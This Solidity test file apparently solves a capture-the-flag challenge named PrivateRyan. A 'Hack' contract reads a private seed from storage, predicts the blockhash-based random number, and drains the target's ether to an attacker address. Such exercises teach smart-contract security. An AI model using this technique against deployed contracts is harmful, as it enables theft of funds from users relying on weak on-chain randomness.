// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import {console} from "../../utils/Console.sol";
import {stdStorage, StdStorage} from "forge-std/stdlib.sol";
import {DSTest} from "ds-test/test.sol";
import {SafeTransferLib} from "solmate/utils/SafeTransferLib.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {Vm} from "forge-std/Vm.sol";

import {PrivateRyan} from "../PrivateRyan.sol";

contract Hack {
    PrivateRyan private pr;
    uint256 private seed;

    constructor(PrivateRyan _pr, uint256 _seed) {
        pr = _pr;
        seed = _seed;
    }

    function attack() external {
        uint256 num = rand(100);
        pr.spin{value: 0.01 ether}(num);
    }

    uint256 private constant FACTOR =
        1157920892373161954235709850086879078532699846656405640394575840079131296399;

    function rand(uint256 max) private returns (uint256) {
        uint256 factor = (FACTOR * 100) / max;
        uint256 blockNumber = block.number - seed;
        uint256 hashVal = uint256(blockhash(blockNumber));

        return uint256((uint256(hashVal) / factor)) % max;
    }
}

contract PrivateRyanTest is DSTest {
    using stdStorage for StdStorage;

    StdStorage stdstore;
    Vm internal immutable vm = Vm(HEVM_ADDRESS);
    uint256 internal constant CONTRACT_ETHER = 10 ether;
    uint256 internal constant USER_ETHER = 1 ether;
    Utilities internal utils;
    address payable internal attacker;

    PrivateRyan internal pr;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");
        vm.deal(address(attacker), USER_ETHER);

        vm.roll(1);
        pr = new PrivateRyan();

        vm.label(address(pr), "PrivateRyan");
        vm.deal(address(pr), CONTRACT_ETHER);

        assertEq(address(attacker).balance, USER_ETHER);
        assertEq(address(pr).balance, CONTRACT_ETHER);
    }

    function testExploit() public {
        bytes32 seed = vm.load(address(pr), bytes32(abi.encodePacked("0")));
        Hack hack = new Hack(pr, uint256(seed));
        hack.attack();
        SafeTransferLib.safeTransferETH(
            address(attacker),
            address(hack).balance
        );
        assertEq(address(attacker).balance, CONTRACT_ETHER + USER_ETHER);
        assertEq(address(pr).balance, 0);
    }
}
